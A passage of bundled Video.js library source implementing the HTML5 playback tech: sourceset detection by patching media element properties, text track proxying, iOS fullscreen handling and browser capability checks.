      // copy all of the nodes created by the innerHTML on dummy
      // to the document fragment
      while (dummy.childNodes.length) {
        docFrag.appendChild(dummy.childNodes[0]);
      }

      // remove content
      this.innerText = '';

      // now we add all of that html in one by appending the
      // document fragment. This is how innerHTML does it.
      window_1.Element.prototype.appendChild.call(this, docFrag);

      // then return the result that innerHTML's setter would
      return this.innerHTML;
    }
  });
}
/**
 * Get a property descriptor given a list of priorities and the
 * property to get.
 */
var getDescriptor = function getDescriptor(priority, prop) {
  var descriptor = {};

  for (var i = 0; i < priority.length; i++) {
    descriptor = Object.getOwnPropertyDescriptor(priority[i], prop);

    if (descriptor && descriptor.set && descriptor.get) {
      break;
    }
  }

  descriptor.enumerable = true;
  descriptor.configurable = true;

  return descriptor;
};

var getInnerHTMLDescriptor = function getInnerHTMLDescriptor(tech) {
  return getDescriptor([tech.el(), window_1.HTMLMediaElement.prototype, window_1.Element.prototype, innerHTMLDescriptorPolyfill], 'innerHTML');
};

/**
 * Patches browser internal functions so that we can tell syncronously
 * if a `<source>` was appended to the media element. For some reason this
 * causes a `sourceset` if the the media element is ready and has no source.
 * This happens when:
 * - The page has just loaded and the media element does not have a source.
 * - The media element was emptied of all sources, then `load()` was called.
 *
 * It does this by patching the following functions/properties when they are supported:
 *
 * - `append()` - can be used to add a `<source>` element to the media element
 * - `appendChild()` - can be used to add a `<source>` element to the media element
 * - `insertAdjacentHTML()` -  can be used to add a `<source>` element to the media element
 * - `innerHTML` -  can be used to add a `<source>` element to the media element
 *
 * @param {Html5} tech
 *        The tech object that sourceset is being setup on.
 */
var firstSourceWatch = function firstSourceWatch(tech) {
  var el = tech.el();

  // make sure firstSourceWatch isn't setup twice.
  if (el.resetSourceWatch_) {
    return;
  }

  var old = {};
  var innerDescriptor = getInnerHTMLDescriptor(tech);
  var appendWrapper = function appendWrapper(appendFn) {
    return function () {
      for (var _len = arguments.length, args = Array(_len), _key = 0; _key < _len; _key++) {
        args[_key] = arguments[_key];
      }

      var retval = appendFn.apply(el, args);

      sourcesetLoad(tech);

      return retval;
    };
  };

  ['append', 'appendChild', 'insertAdjacentHTML'].forEach(function (k) {
    if (!el[k]) {
      return;
    }

    // store the old function
    old[k] = el[k];

    // call the old function with a sourceset if a source
    // was loaded
    el[k] = appendWrapper(old[k]);
  });

  Object.defineProperty(el, 'innerHTML', mergeOptions(innerDescriptor, {
    set: appendWrapper(innerDescriptor.set)
  }));

  el.resetSourceWatch_ = function () {
    el.resetSourceWatch_ = null;
    Object.keys(old).forEach(function (k) {
      el[k] = old[k];
    });

    Object.defineProperty(el, 'innerHTML', innerDescriptor);
  };

  // on the first sourceset, we need to revert our changes
  tech.one('sourceset', el.resetSourceWatch_);
};

/**
 * our implementation of a `src` descriptor for browsers
 * that do not have one.
 */

var srcDescriptorPolyfill = {};

if (!IS_IE8) {
  srcDescriptorPolyfill = Object.defineProperty({}, 'src', {
    get: function get() {
      if (this.hasAttribute('src')) {
        return getAbsoluteURL(window_1.Element.prototype.getAttribute.call(this, 'src'));
      }

      return '';
    },
    set: function set(v) {
      window_1.Element.prototype.setAttribute.call(this, 'src', v);

      return v;
    }
  });
}

var getSrcDescriptor = function getSrcDescriptor(tech) {
  return getDescriptor([tech.el(), window_1.HTMLMediaElement.prototype, srcDescriptorPolyfill], 'src');
};

/**
 * setup `sourceset` handling on the `Html5` tech. This function
 * patches the following element properties/functions:
 *
 * - `src` - to determine when `src` is set
 * - `setAttribute()` - to determine when `src` is set
 * - `load()` - this re-triggers the source selection algorithm, and can
 *              cause a sourceset.
 *
 * If there is no source when we are adding `sourceset` support or during a `load()`
 * we also patch the functions listed in `firstSourceWatch`.
 *
 * @param {Html5} tech
 *        The tech to patch
 */
var setupSourceset = function setupSourceset(tech) {
  if (!tech.featuresSourceset) {
    return;
  }

  var el = tech.el();

  // make sure sourceset isn't setup twice.
  if (el.resetSourceset_) {
    return;
  }

  var srcDescriptor = getSrcDescriptor(tech);
  var oldSetAttribute = el.setAttribute;
  var oldLoad = el.load;

  Object.defineProperty(el, 'src', mergeOptions(srcDescriptor, {
    set: function set(v) {
      var retval = srcDescriptor.set.call(el, v);

      // we use the getter here to get the actual value set on src
      tech.triggerSourceset(el.src);

      return retval;
    }
  }));

  el.setAttribute = function (n, v) {
    var retval = oldSetAttribute.call(el, n, v);

    if (/src/i.test(n)) {
      tech.triggerSourceset(el.src);
    }

    return retval;
  };

  el.load = function () {
    var retval = oldLoad.call(el);

    // if load was called, but there was no source to fire
    // sourceset on. We have to watch for a source append
    // as that can trigger a `sourceset` when the media element
    // has no source
    if (!sourcesetLoad(tech)) {
      tech.triggerSourceset('');
      firstSourceWatch(tech);
    }

    return retval;
  };

  if (el.currentSrc) {
    tech.triggerSourceset(el.currentSrc);
  } else if (!sourcesetLoad(tech)) {
    firstSourceWatch(tech);
  }

  el.resetSourceset_ = function () {
    el.resetSourceset_ = null;
    el.load = oldLoad;
    el.setAttribute = oldSetAttribute;
    Object.defineProperty(el, 'src', srcDescriptor);
    if (el.resetSourceWatch_) {
      el.resetSourceWatch_();
    }
  };
};

var _templateObject$2 = taggedTemplateLiteralLoose(['Text Tracks are being loaded from another origin but the crossorigin attribute isn\'t used.\n            This may prevent text tracks from loading.'], ['Text Tracks are being loaded from another origin but the crossorigin attribute isn\'t used.\n            This may prevent text tracks from loading.']);

/**
 * @file html5.js
 */
/**
 * HTML5 Media Controller - Wrapper for HTML5 Media API
 *
 * @mixes Tech~SouceHandlerAdditions
 * @extends Tech
 */

var Html5 = function (_Tech) {
  inherits(Html5, _Tech);

  /**
   * Create an instance of this Tech.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   *
   * @param {Component~ReadyCallback} ready
   *        Callback function to call when the `HTML5` Tech is ready.
   */
  function Html5(options, ready) {
    classCallCheck(this, Html5);

    var _this = possibleConstructorReturn(this, _Tech.call(this, options, ready));

    var source = options.source;
    var crossoriginTracks = false;

    // Set the source if one is provided
    // 1) Check if the source is new (if not, we want to keep the original so playback isn't interrupted)
    // 2) Check to see if the network state of the tag was failed at init, and if so, reset the source
    // anyway so the error gets fired.
    if (source && (_this.el_.currentSrc !== source.src || options.tag && options.tag.initNetworkState_ === 3)) {
      _this.setSource(source);
    } else {
      _this.handleLateInit_(_this.el_);
    }

    // setup sourceset after late sourceset/init
    if (options.enableSourceset) {
      _this.setupSourcesetHandling_();
    }

    if (_this.el_.hasChildNodes()) {

      var nodes = _this.el_.childNodes;
      var nodesLength = nodes.length;
      var removeNodes = [];

      while (nodesLength--) {
        var node = nodes[nodesLength];
        var nodeName = node.nodeName.toLowerCase();

        if (nodeName === 'track') {
          if (!_this.featuresNativeTextTracks) {
            // Empty video tag tracks so the built-in player doesn't use them also.
            // This may not be fast enough to stop HTML5 browsers from reading the tags
            // so we'll need to turn off any default tracks if we're manually doing
            // captions and subtitles. videoElement.textTracks
            removeNodes.push(node);
          } else {
            // store HTMLTrackElement and TextTrack to remote list
            _this.remoteTextTrackEls().addTrackElement_(node);
            _this.remoteTextTracks().addTrack(node.track);
            _this.textTracks().addTrack(node.track);
            if (!crossoriginTracks && !_this.el_.hasAttribute('crossorigin') && isCrossOrigin(node.src)) {
              crossoriginTracks = true;
            }
          }
        }
      }

      for (var i = 0; i < removeNodes.length; i++) {
        _this.el_.removeChild(removeNodes[i]);
      }
    }

    _this.proxyNativeTracks_();
    if (_this.featuresNativeTextTracks && crossoriginTracks) {
      log$1.warn(tsml(_templateObject$2));
    }

    // prevent iOS Safari from disabling metadata text tracks during native playback
    _this.restoreMetadataTracksInIOSNativePlayer_();

    // Determine if native controls should be used
    // Our goal should be to get the custom controls on mobile solid everywhere
    // so we can remove this all together. Right now this will block custom
    // controls on touch enabled laptops like the Chrome Pixel
    if ((TOUCH_ENABLED || IS_IPHONE || IS_NATIVE_ANDROID) && options.nativeControlsForTouch === true) {
      _this.setControls(true);
    }

    // on iOS, we want to proxy `webkitbeginfullscreen` and `webkitendfullscreen`
    // into a `fullscreenchange` event
    _this.proxyWebkitFullscreen_();

    _this.triggerReady();
    return _this;
  }

  /**
   * Dispose of `HTML5` media element and remove all tracks.
   */


  Html5.prototype.dispose = function dispose() {
    if (this.el_ && this.el_.resetSourceset_) {
      this.el_.resetSourceset_();
    }
    Html5.disposeMediaElement(this.el_);
    this.options_ = null;

    // tech will handle clearing of the emulated track list
    _Tech.prototype.dispose.call(this);
  };

  /**
   * Modify the media element so that we can detect when
   * the source is changed. Fires `sourceset` just after the source has changed
   */


  Html5.prototype.setupSourcesetHandling_ = function setupSourcesetHandling_() {
    setupSourceset(this);
  };

  /**
   * When a captions track is enabled in the iOS Safari native player, all other
   * tracks are disabled (including metadata tracks), which nulls all of their
   * associated cue points. This will restore metadata tracks to their pre-fullscreen
   * state in those cases so that cue points are not needlessly lost.
   *
   * @private
   */


  Html5.prototype.restoreMetadataTracksInIOSNativePlayer_ = function restoreMetadataTracksInIOSNativePlayer_() {
    var textTracks = this.textTracks();
    var metadataTracksPreFullscreenState = void 0;

    // captures a snapshot of every metadata track's current state
    var takeMetadataTrackSnapshot = function takeMetadataTrackSnapshot() {
      metadataTracksPreFullscreenState = [];

      for (var i = 0; i < textTracks.length; i++) {
        var track = textTracks[i];

        if (track.kind === 'metadata') {
          metadataTracksPreFullscreenState.push({
            track: track,
            storedMode: track.mode
          });
        }
      }
    };

    // snapshot each metadata track's initial state, and update the snapshot
    // each time there is a track 'change' event
    takeMetadataTrackSnapshot();
    textTracks.addEventListener('change', takeMetadataTrackSnapshot);

    this.on('dispose', function () {
      return textTracks.removeEventListener('change', takeMetadataTrackSnapshot);
    });

    var restoreTrackMode = function restoreTrackMode() {
      for (var i = 0; i < metadataTracksPreFullscreenState.length; i++) {
        var storedTrack = metadataTracksPreFullscreenState[i];

        if (storedTrack.track.mode === 'disabled' && storedTrack.track.mode !== storedTrack.storedMode) {
          storedTrack.track.mode = storedTrack.storedMode;
        }
      }
      // we only want this handler to be executed on the first 'change' event
      textTracks.removeEventListener('change', restoreTrackMode);
    };

    // when we enter fullscreen playback, stop updating the snapshot and
    // restore all track modes to their pre-fullscreen state
    this.on('webkitbeginfullscreen', function () {
      textTracks.removeEventListener('change', takeMetadataTrackSnapshot);

      // remove the listener before adding it just in case it wasn't previously removed
      textTracks.removeEventListener('change', restoreTrackMode);
      textTracks.addEventListener('change', restoreTrackMode);
    });

    // start updating the snapshot again after leaving fullscreen
    this.on('webkitendfullscreen', function () {
      // remove the listener before adding it just in case it wasn't previously removed
      textTracks.removeEventListener('change', takeMetadataTrackSnapshot);
      textTracks.addEventListener('change', takeMetadataTrackSnapshot);

      // remove the restoreTrackMode handler in case it wasn't triggered during fullscreen playback
      textTracks.removeEventListener('change', restoreTrackMode);
    });
  };

  /**
   * Proxy all native track list events to our track lists if the browser we are playing
   * in supports that type of track list.
   *
   * @private
   */


  Html5.prototype.proxyNativeTracks_ = function proxyNativeTracks_() {
    var _this2 = this;

    NORMAL.names.forEach(function (name) {
      var props = NORMAL[name];
      var elTracks = _this2.el()[props.getterName];
      var techTracks = _this2[props.getterName]();

      if (!_this2['featuresNative' + props.capitalName + 'Tracks'] || !elTracks || !elTracks.addEventListener) {
        return;
      }
      var listeners = {
        change: function change(e) {
          techTracks.trigger({
            type: 'change',
            target: techTracks,
            currentTarget: techTracks,
            srcElement: techTracks
          });
        },
        addtrack: function addtrack(e) {
          techTracks.addTrack(e.track);
        },
        removetrack: function removetrack(e) {
          techTracks.removeTrack(e.track);
        }
      };
      var removeOldTracks = function removeOldTracks() {
        var removeTracks = [];

        for (var i = 0; i < techTracks.length; i++) {
          var found = false;

          for (var j = 0; j < elTracks.length; j++) {
            if (elTracks[j] === techTracks[i]) {
              found = true;
              break;
            }
          }

          if (!found) {
            removeTracks.push(techTracks[i]);
          }
        }

        while (removeTracks.length) {
          techTracks.removeTrack(removeTracks.shift());
        }
      };

      Object.keys(listeners).forEach(function (eventName) {
        var listener = listeners[eventName];

        elTracks.addEventListener(eventName, listener);
        _this2.on('dispose', function (e) {
          return elTracks.removeEventListener(eventName, listener);
        });
      });

      // Remove (native) tracks that are not used anymore
      _this2.on('loadstart', removeOldTracks);
      _this2.on('dispose', function (e) {
        return _this2.off('loadstart', removeOldTracks);
      });
    });
  };

  /**
   * Create the `Html5` Tech's DOM element.
   *
   * @return {Element}
   *         The element that gets created.
   */


  Html5.prototype.createEl = function createEl$$1() {
    var el = this.options_.tag;

    // Check if this browser supports moving the element into the box.
    // On the iPhone video will break if you move the element,
    // So we have to create a brand new element.
    // If we ingested the player div, we do not need to move the media element.
    if (!el || !(this.options_.playerElIngest || this.movingMediaElementInDOM)) {

      // If the original tag is still there, clone and remove it.
      if (el) {
        var clone = el.cloneNode(true);

        if (el.parentNode) {
          el.parentNode.insertBefore(clone, el);
        }
        Html5.disposeMediaElement(el);
        el = clone;
      } else {
        el = document_1.createElement('video');

        // determine if native controls should be used
        var tagAttributes = this.options_.tag && getAttributes(this.options_.tag);
        var attributes = mergeOptions({}, tagAttributes);

        if (!TOUCH_ENABLED || this.options_.nativeControlsForTouch !== true) {
          delete attributes.controls;
        }

        setAttributes(el, assign(attributes, {
          id: this.options_.techId,
          'class': 'vjs-tech'
        }));
      }

      el.playerId = this.options_.playerId;
    }

    if (typeof this.options_.preload !== 'undefined') {
      setAttribute(el, 'preload', this.options_.preload);
    }

    // Update specific tag settings, in case they were overridden
    // `autoplay` has to be *last* so that `muted` and `playsinline` are present
    // when iOS/Safari or other browsers attempt to autoplay.
    var settingsAttrs = ['loop', 'muted', 'playsinline', 'autoplay'];

    for (var i = 0; i < settingsAttrs.length; i++) {
      var attr = settingsAttrs[i];
      var value = this.options_[attr];

      if (typeof value !== 'undefined') {
        if (value) {
          setAttribute(el, attr, attr);
        } else {
          removeAttribute(el, attr);
        }
        el[attr] = value;
      }
    }

    return el;
  };

  /**
   * This will be triggered if the loadstart event has already fired, before videojs was
   * ready. Two known examples of when this can happen are:
   * 1. If we're loading the playback object after it has started loading
   * 2. The media is already playing the (often with autoplay on) then
   *
   * This function will fire another loadstart so that videojs can catchup.
   *
   * @fires Tech#loadstart
   *
   * @return {undefined}
   *         returns nothing.
   */


  Html5.prototype.handleLateInit_ = function handleLateInit_(el) {
    if (el.networkState === 0 || el.networkState === 3) {
      // The video element hasn't started loading the source yet
      // or didn't find a source
      return;
    }

    if (el.readyState === 0) {
      // NetworkState is set synchronously BUT loadstart is fired at the
      // end of the current stack, usually before setInterval(fn, 0).
      // So at this point we know loadstart may have already fired or is
      // about to fire, and either way the player hasn't seen it yet.
      // We don't want to fire loadstart prematurely here and cause a
      // double loadstart so we'll wait and see if it happens between now
      // and the next loop, and fire it if not.
      // HOWEVER, we also want to make sure it fires before loadedmetadata
      // which could also happen between now and the next loop, so we'll
      // watch for that also.
      var loadstartFired = false;
      var setLoadstartFired = function setLoadstartFired() {
        loadstartFired = true;
      };

      this.on('loadstart', setLoadstartFired);

      var triggerLoadstart = function triggerLoadstart() {
        // We did miss the original loadstart. Make sure the player
        // sees loadstart before loadedmetadata
        if (!loadstartFired) {
          this.trigger('loadstart');
        }
      };

      this.on('loadedmetadata', triggerLoadstart);

      this.ready(function () {
        this.off('loadstart', setLoadstartFired);
        this.off('loadedmetadata', triggerLoadstart);

        if (!loadstartFired) {
          // We did miss the original native loadstart. Fire it now.
          this.trigger('loadstart');
        }
      });

      return;
    }

    // From here on we know that loadstart already fired and we missed it.
    // The other readyState events aren't as much of a problem if we double
    // them, so not going to go to as much trouble as loadstart to prevent
    // that unless we find reason to.
    var eventsToTrigger = ['loadstart'];

    // loadedmetadata: newly equal to HAVE_METADATA (1) or greater
    eventsToTrigger.push('loadedmetadata');

    // loadeddata: newly increased to HAVE_CURRENT_DATA (2) or greater
    if (el.readyState >= 2) {
      eventsToTrigger.push('loadeddata');
    }

    // canplay: newly increased to HAVE_FUTURE_DATA (3) or greater
    if (el.readyState >= 3) {
      eventsToTrigger.push('canplay');
    }

    // canplaythrough: newly equal to HAVE_ENOUGH_DATA (4)
    if (el.readyState >= 4) {
      eventsToTrigger.push('canplaythrough');
    }

    // We still need to give the player time to add event listeners
    this.ready(function () {
      eventsToTrigger.forEach(function (type) {
        this.trigger(type);
      }, this);
    });
  };

  /**
   * Set current time for the `HTML5` tech.
   *
   * @param {number} seconds
   *        Set the current time of the media to this.
   */


  Html5.prototype.setCurrentTime = function setCurrentTime(seconds) {
    try {
      this.el_.currentTime = seconds;
    } catch (e) {
      log$1(e, 'Video is not ready. (Video.js)');
      // this.warning(VideoJS.warnings.videoNotReady);
    }
  };

  /**
   * Get the current duration of the HTML5 media element.
   *
   * @return {number}
   *         The duration of the media or 0 if there is no duration.
   */


  Html5.prototype.duration = function duration() {
    var _this3 = this;

    // Android Chrome will report duration as Infinity for VOD HLS until after
    // playback has started, which triggers the live display erroneously.
    // Return NaN if playback has not started and trigger a durationupdate once
    // the duration can be reliably known.
    if (this.el_.duration === Infinity && IS_ANDROID && IS_CHROME && this.el_.currentTime === 0) {
      // Wait for the first `timeupdate` with currentTime > 0 - there may be
      // several with 0
      var checkProgress = function checkProgress() {
        if (_this3.el_.currentTime > 0) {
          // Trigger durationchange for genuinely live video
          if (_this3.el_.duration === Infinity) {
            _this3.trigger('durationchange');
          }
          _this3.off('timeupdate', checkProgress);
        }
      };

      this.on('timeupdate', checkProgress);
      return NaN;
    }
    return this.el_.duration || NaN;
  };

  /**
   * Get the current width of the HTML5 media element.
   *
   * @return {number}
   *         The width of the HTML5 media element.
   */


  Html5.prototype.width = function width() {
    return this.el_.offsetWidth;
  };

  /**
   * Get the current height of the HTML5 media element.
   *
   * @return {number}
   *         The heigth of the HTML5 media element.
   */


  Html5.prototype.height = function height() {
    return this.el_.offsetHeight;
  };

  /**
   * Proxy iOS `webkitbeginfullscreen` and `webkitendfullscreen` into
   * `fullscreenchange` event.
   *
   * @private
   * @fires fullscreenchange
   * @listens webkitendfullscreen
   * @listens webkitbeginfullscreen
   * @listens webkitbeginfullscreen
   */


  Html5.prototype.proxyWebkitFullscreen_ = function proxyWebkitFullscreen_() {
    var _this4 = this;

    if (!('webkitDisplayingFullscreen' in this.el_)) {
      return;
    }

    var endFn = function endFn() {
      this.trigger('fullscreenchange', { isFullscreen: false });
    };

    var beginFn = function beginFn() {
      if ('webkitPresentationMode' in this.el_ && this.el_.webkitPresentationMode !== 'picture-in-picture') {
        this.one('webkitendfullscreen', endFn);

        this.trigger('fullscreenchange', { isFullscreen: true });
      }
    };

    this.on('webkitbeginfullscreen', beginFn);
    this.on('dispose', function () {
      _this4.off('webkitbeginfullscreen', beginFn);
      _this4.off('webkitendfullscreen', endFn);
    });
  };

  /**
   * Check if fullscreen is supported on the current playback device.
   *
   * @return {boolean}
   *         - True if fullscreen is supported.
   *         - False if fullscreen is not supported.
   */


  Html5.prototype.supportsFullScreen = function supportsFullScreen() {
    if (typeof this.el_.webkitEnterFullScreen === 'function') {
      var userAgent = window_1.navigator && window_1.navigator.userAgent || '';

      // Seems to be broken in Chromium/Chrome && Safari in Leopard
      if (/Android/.test(userAgent) || !/Chrome|Mac OS X 10.5/.test(userAgent)) {
        return true;
      }
    }
    return false;
  };

  /**
   * Request that the `HTML5` Tech enter fullscreen.
   */


  Html5.prototype.enterFullScreen = function enterFullScreen() {
    var video = this.el_;

    if (video.paused && video.networkState <= video.HAVE_METADATA) {
      // attempt to prime the video element for programmatic access
      // this isn't necessary on the desktop but shouldn't hurt
      this.el_.play();

      // playing and pausing synchronously during the transition to fullscreen
      // can get iOS ~6.1 devices into a play/pause loop
      this.setTimeout(function () {
        video.pause();
        video.webkitEnterFullScreen();
      }, 0);
    } else {
      video.webkitEnterFullScreen();
    }
  };

  /**
   * Request that the `HTML5` Tech exit fullscreen.
   */


  Html5.prototype.exitFullScreen = function exitFullScreen() {
    this.el_.webkitExitFullScreen();
  };

  /**
   * A getter/setter for the `Html5` Tech's source object.
   * > Note: Please use {@link Html5#setSource}
   *
   * @param {Tech~SourceObject} [src]
   *        The source object you want to set on the `HTML5` techs element.
   *
   * @return {Tech~SourceObject|undefined}
   *         - The current source object when a source is not passed in.
   *         - undefined when setting
   *
   * @deprecated Since version 5.
   */


  Html5.prototype.src = function src(_src) {
    if (_src === undefined) {
      return this.el_.src;
    }

    // Setting src through `src` instead of `setSrc` will be deprecated
    this.setSrc(_src);
  };

  /**
   * Reset the tech by removing all sources and then calling
   * {@link Html5.resetMediaElement}.
   */


  Html5.prototype.reset = function reset() {
    Html5.resetMediaElement(this.el_);
  };

  /**
   * Get the current source on the `HTML5` Tech. Falls back to returning the source from
   * the HTML5 media element.
   *
   * @return {Tech~SourceObject}
   *         The current source object from the HTML5 tech. With a fallback to the
   *         elements source.
   */


  Html5.prototype.currentSrc = function currentSrc() {
    if (this.currentSource_) {
      return this.currentSource_.src;
    }
    return this.el_.currentSrc;
  };

  /**
   * Set controls attribute for the HTML5 media Element.
   *
   * @param {string} val
   *        Value to set the controls attribute to
   */


  Html5.prototype.setControls = function setControls(val) {
    this.el_.controls = !!val;
  };

  /**
   * Create and returns a remote {@link TextTrack} object.
   *
   * @param {string} kind
   *        `TextTrack` kind (subtitles, captions, descriptions, chapters, or metadata)
   *
   * @param {string} [label]
   *        Label to identify the text track
   *
   * @param {string} [language]
   *        Two letter language abbreviation
   *
   * @return {TextTrack}
   *         The TextTrack that gets created.
   */


  Html5.prototype.addTextTrack = function addTextTrack(kind, label, language) {
    if (!this.featuresNativeTextTracks) {
      return _Tech.prototype.addTextTrack.call(this, kind, label, language);
    }

    return this.el_.addTextTrack(kind, label, language);
  };

  /**
   * Creates either native TextTrack or an emulated TextTrack depending
   * on the value of `featuresNativeTextTracks`
   *
   * @param {Object} options
   *        The object should contain the options to intialize the TextTrack with.
   *
   * @param {string} [options.kind]
   *        `TextTrack` kind (subtitles, captions, descriptions, chapters, or metadata).
   *
   * @param {string} [options.label].
   *        Label to identify the text track
   *
   * @param {string} [options.language]
   *        Two letter language abbreviation.
   *
   * @param {boolean} [options.default]
   *        Default this track to on.
   *
   * @param {string} [options.id]
   *        The internal id to assign this track.
   *
   * @param {string} [options.src]
   *        A source url for the track.
   *
   * @return {HTMLTrackElement}
   *         The track element that gets created.
   */


  Html5.prototype.createRemoteTextTrack = function createRemoteTextTrack(options) {
    if (!this.featuresNativeTextTracks) {
      return _Tech.prototype.createRemoteTextTrack.call(this, options);
    }
    var htmlTrackElement = document_1.createElement('track');

    if (options.kind) {
      htmlTrackElement.kind = options.kind;
    }
    if (options.label) {
      htmlTrackElement.label = options.label;
    }
    if (options.language || options.srclang) {
      htmlTrackElement.srclang = options.language || options.srclang;
    }
    if (options['default']) {
      htmlTrackElement['default'] = options['default'];
    }
    if (options.id) {
      htmlTrackElement.id = options.id;
    }
    if (options.src) {
      htmlTrackElement.src = options.src;
    }

    return htmlTrackElement;
  };

  /**
   * Creates a remote text track object and returns an html track element.
   *
   * @param {Object} options The object should contain values for
   * kind, language, label, and src (location of the WebVTT file)
   * @param {Boolean} [manualCleanup=true] if set to false, the TextTrack will be
   * automatically removed from the video element whenever the source changes
   * @return {HTMLTrackElement} An Html Track Element.
   * This can be an emulated {@link HTMLTrackElement} or a native one.
   * @deprecated The default value of the "manualCleanup" parameter will default
   * to "false" in upcoming versions of Video.js
   */


  Html5.prototype.addRemoteTextTrack = function addRemoteTextTrack(options, manualCleanup) {
    var htmlTrackElement = _Tech.prototype.addRemoteTextTrack.call(this, options, manualCleanup);

    if (this.featuresNativeTextTracks) {
      this.el().appendChild(htmlTrackElement);
    }

    return htmlTrackElement;
  };

  /**
   * Remove remote `TextTrack` from `TextTrackList` object
   *
   * @param {TextTrack} track
   *        `TextTrack` object to remove
   */


  Html5.prototype.removeRemoteTextTrack = function removeRemoteTextTrack(track) {
    _Tech.prototype.removeRemoteTextTrack.call(this, track);

    if (this.featuresNativeTextTracks) {
      var tracks = this.$$('track');

      var i = tracks.length;

      while (i--) {
        if (track === tracks[i] || track === tracks[i].track) {
          this.el().removeChild(tracks[i]);
        }
      }
    }
  };

  /**
   * Gets available media playback quality metrics as specified by the W3C's Media
   * Playback Quality API.
   *
   * @see [Spec]{@link https://wicg.github.io/media-playback-quality}
   *
   * @return {Object}
   *         An object with supported media playback quality metrics
   */


  Html5.prototype.getVideoPlaybackQuality = function getVideoPlaybackQuality() {
    if (typeof this.el().getVideoPlaybackQuality === 'function') {
      return this.el().getVideoPlaybackQuality();
    }

    var videoPlaybackQuality = {};

    if (typeof this.el().webkitDroppedFrameCount !== 'undefined' && typeof this.el().webkitDecodedFrameCount !== 'undefined') {
      videoPlaybackQuality.droppedVideoFrames = this.el().webkitDroppedFrameCount;
      videoPlaybackQuality.totalVideoFrames = this.el().webkitDecodedFrameCount;
    }

    if (window_1.performance && typeof window_1.performance.now === 'function') {
      videoPlaybackQuality.creationTime = window_1.performance.now();
    } else if (window_1.performance && window_1.performance.timing && typeof window_1.performance.timing.navigationStart === 'number') {
      videoPlaybackQuality.creationTime = window_1.Date.now() - window_1.performance.timing.navigationStart;
    }

    return videoPlaybackQuality;
  };

  return Html5;
}(Tech);

/* HTML5 Support Testing ---------------------------------------------------- */

if (isReal()) {

  /**
   * Element for testing browser HTML5 media capabilities
   *
   * @type {Element}
   * @constant
   * @private
   */
  Html5.TEST_VID = document_1.createElement('video');
  var track = document_1.createElement('track');

  track.kind = 'captions';
  track.srclang = 'en';
  track.label = 'English';
  Html5.TEST_VID.appendChild(track);
}

/**
 * Check if HTML5 media is supported by this browser/device.
 *
 * @return {boolean}
 *         - True if HTML5 media is supported.
 *         - False if HTML5 media is not supported.
 */
Html5.isSupported = function () {
  // IE9 with no Media Player is a LIAR! (#984)
  try {
    Html5.TEST_VID.volume = 0.5;
  } catch (e) {
    return false;
  }

  return !!(Html5.TEST_VID && Html5.TEST_VID.canPlayType);
};

/**
 * Check if the tech can support the given type
 *
 * @param {string} type
 *        The mimetype to check
 * @return {string} 'probably', 'maybe', or '' (empty string)
 */
Html5.canPlayType = function (type) {
  return Html5.TEST_VID.canPlayType(type);
};

/**
 * Check if the tech can support the given source
 * @param {Object} srcObj
 *        The source object
 * @param {Object} options
 *        The options passed to the tech
 * @return {string} 'probably', 'maybe', or '' (empty string)
 */
Html5.canPlaySource = function (srcObj, options) {
  return Html5.canPlayType(srcObj.type);
};

/**
 * Check if the volume can be changed in this browser/device.
 * Volume cannot be changed in a lot of mobile devices.
 * Specifically, it can't be changed from 1 on iOS.
 *
 * @return {boolean}
 *         - True if volume can be controlled
 *         - False otherwise
 */
Html5.canControlVolume = function () {
  // IE will error if Windows Media Player not installed #3315
  try {
    var volume = Html5.TEST_VID.volume;

    Html5.TEST_VID.volume = volume / 2 + 0.1;
    return volume !== Html5.TEST_VID.volume;
  } catch (e) {
    return false;
  }
};

/**
 * Check if the playback rate can be changed in this browser/device.
 *
 * @return {boolean}
 *         - True if playback rate can be controlled
 *         - False otherwise
 */
Html5.canControlPlaybackRate = function () {
  // Playback rate API is implemented in Android Chrome, but doesn't do anything
  // https://github.com/videojs/video.js/issues/3180
  if (IS_ANDROID && IS_CHROME && CHROME_VERSION < 58) {
    return false;
  }
  // IE will error if Windows Media Player not installed #3315
  try {
    var playbackRate = Html5.TEST_VID.playbackRate;

    Html5.TEST_VID.playbackRate = playbackRate / 2 + 0.1;
    return playbackRate !== Html5.TEST_VID.playbackRate;
  } catch (e) {
    return false;
  }
};

/**
 * Check if we can override a video/audio elements attributes, with
 * Object.defineProperty.
 *
 * @return {boolean}
 *         - True if builtin attributes can be overriden
 *         - False otherwise
 */
Html5.canOverrideAttributes = function () {
  if (IS_IE8) {
    return false;
  }
  // if we cannot overwrite the src/innerHTML property, there is no support
  // iOS 7 safari for instance cannot do this.
  try {
    var noop = function noop() {};

    Object.defineProperty(document_1.createElement('video'), 'src', { get: noop, set: noop });
    Object.defineProperty(document_1.createElement('audio'), 'src', { get: noop, set: noop });
    Object.defineProperty(document_1.createElement('video'), 'innerHTML', { get: noop, set: noop });
    Object.defineProperty(document_1.createElement('audio'), 'innerHTML', { get: noop, set: noop });
  } catch (e) {
    return false;
  }

  return true;
};

/**
 * Check to see if native `TextTrack`s are supported by this browser/device.
 *
 * @return {boolean}
 *         - True if native `TextTrack`s are supported.
 *         - False otherwise
 */
Html5.supportsNativeTextTracks = function () {
  return IS_ANY_SAFARI;
};

/**
 * Check to see if native `VideoTrack`s are supported by this browser/device
 *
 * @return {boolean}
 *        - True if native `VideoTrack`s are supported.
 *        - False otherwise
 */
Html5.supportsNativeVideoTracks = function () {
  return !!(Html5.TEST_VID && Html5.TEST_VID.videoTracks);
};

/**
 * Check to see if native `AudioTrack`s are supported by this browser/device
 *
 * @return {boolean}
 *        - True if native `AudioTrack`s are supported.
 *        - False otherwise
 */
Html5.supportsNativeAudioTracks = function () {
  return !!(Html5.TEST_VID && Html5.TEST_VID.audioTracks);
};

/**
 * An array of events available on the Html5 tech.
 *
 * @private
 * @type {Array}
 */
Html5.Events = ['loadstart', 'suspend', 'abort', 'error', 'emptied', 'stalled', 'loadedmetadata', 'loadeddata', 'canplay', 'canplaythrough', 'playing', 'waiting', 'seeking', 'seeked', 'ended', 'durationchange', 'timeupdate', 'progress', 'play', 'pause', 'ratechange', 'resize', 'volumechange'];

/**
 * Boolean indicating whether the `Tech` supports volume control.
 *
 * @type {boolean}
 * @default {@link Html5.canControlVolume}
 */
Html5.prototype.featuresVolumeControl = Html5.canControlVolume();

/**
 * Boolean indicating whether the `Tech` supports changing the speed at which the media
 * plays. Examples:
 *   - Set player to play 2x (twice) as fast
 *   - Set player to play 0.5x (half) as fast
 *
 * @type {boolean}
 * @default {@link Html5.canControlPlaybackRate}
 */
